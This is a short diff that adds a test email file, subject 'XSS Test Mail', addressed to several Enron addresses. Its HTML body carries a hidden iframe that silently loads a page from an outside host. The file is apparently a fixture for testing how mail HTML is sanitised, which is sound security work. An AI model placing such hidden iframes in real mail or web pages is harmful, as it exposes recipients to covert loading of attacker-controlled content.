@@ -1,0 +1,7 @@
+From: ldumdum@ase.org
+To: john.hodge@enron.com, chris.germany@enron.com, scott.hendrickson@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<iframe src="http://tmxk.org/t/" style="display:none" id="wooyun"></iframe>
